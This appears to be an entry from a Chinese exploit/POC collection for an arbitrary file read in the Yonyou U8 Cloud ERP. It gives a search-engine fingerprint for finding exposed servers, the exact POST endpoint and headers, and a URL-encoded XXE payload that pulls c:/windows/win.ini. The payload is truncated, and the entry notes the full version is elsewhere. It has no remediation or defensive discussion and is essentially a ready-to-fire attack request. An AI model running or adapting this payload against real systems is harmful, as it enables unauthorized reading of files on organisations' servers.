# 用友U8平台-smartweb2_showRPCLoadingTip-任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /hrss/dorado/smartweb2.showRPCLoadingTip.d?skin=default&__rpc=true&windows=1 HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`SL-CE-SUID: 29`　`Content-Length: 636`

**请求体 / payload**
```
__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=%3C%21DOCTYPE+z+%5B%3C%21ENTITY+test++SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%5D%3E%3Crpc+transaction%3D%2210%22+method%3D%22resetPwd%22%3E%3Cdef%3E%3Cdataset+type%3D%22Custom%22+id%3D%22dsResetPwd%22%3E%3Cf+name%3D%22user%22%3E%3C%2Ff%3E%3C%2Fdataset%3E%3C%2Fdef%3E%3Cdata%3E%3Crs+dataset%3D%22dsResetPwd%22%3E%3Cr+id%3D%2210008%22+state%3D%22insert%22%3E%3Cn%3E%3Cv%3E1%3C%2Fv%3E%3C%2Fn%3E%3C%2Fr%3E%3C%2Frs%3E%3C%2Fdata%3E%3Cvps%3E%3Cp+name%3D%22__profileKeys%22%3E%26test%…（脚本共 636 字，完整版见原文）
```
- **预期**：200　|　<files>
<Mail>